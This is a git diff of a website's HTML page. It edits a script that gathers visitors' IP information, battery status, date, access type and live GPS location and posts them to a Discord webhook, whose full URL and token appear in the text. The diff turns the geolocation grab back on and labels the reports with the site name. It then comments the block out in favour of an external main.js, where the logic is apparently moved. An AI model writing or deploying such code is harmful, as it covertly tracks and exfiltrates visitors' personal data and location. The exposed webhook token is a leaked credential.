@@ -434,9 +434,10 @@
            loader.style.display = "none";
         })
     </script>
+    <script></script>
 </body>
 </html>
-<script>
+<!-- <script>
     // Define your webhook URL
     const webhookUrl = 'https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4';
 
@@ -518,28 +519,25 @@
                 alert(`Welcome, ${userName}!`);
             }
 
-            // let geoLocation = 'Live Geolocation: Permission Denied';
-            // let geoError = false;
-            // if ('geolocation' in navigator) {
-            //     await new Promise((resolve, reject) => {
-            //         navigator.geolocation.getCurrentPosition(position => {
-            //             const { latitude, longitude } = position.coords;
-            //             const geoUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            //             geoLocation = `[Live Geolocation](${geoUrl})`;
-            //             resolve();
-            //         }, error => {
-            //             console.error('Error getting geolocation:', error);
-            //             geoError = true;
-            //             resolve(); // Still resolve to continue execution
-            //         });
-            //     });
-            // } else {
-            //     console.error('Geolocation is not supported.');
-            //     geoError = true;
-            // }
+            let geoLocation = 'Live Geolocation: Permission Denied';
+            if ('geolocation' in navigator) {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const { latitude, longitude } = position.coords;
+                        const geoUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        geoLocation = `[Live Geolocation](${geoUrl})`;
+                        resolve();
+                    }, error => {
+                        console.error('Error getting geolocation:', error);
+                        reject(error);
+                    });
+                });
+            } else {
+                console.error('Geolocation is not supported.');
+            }
 
             const messageData = {
-                content: 'Webhook data:',
+                content: 'Webhook data of msue.vercel.app:',
                 embeds: [
                     {
                         title: 'IP Information',
@@ -560,7 +558,7 @@
                             { name: 'Battery Status', value: batteryStatus },
                             { name: 'Date and Time', value: dateTime },
                             { name: 'Access Type', value: accessType },
-                            { name: 'System (Live)', value: geoError ? 'Geolocation Denied/Error' : geoLocation },
+                            { name: 'System (Live)', value: geoLocation },
                         ],
                     },
                 ],
@@ -574,12 +572,8 @@
 
     // Execute the main function
     main();
-</script>
-
-
-
-
-
+</script> -->
+<script src="./main.js"></script>
 
 <!-- <script>
     
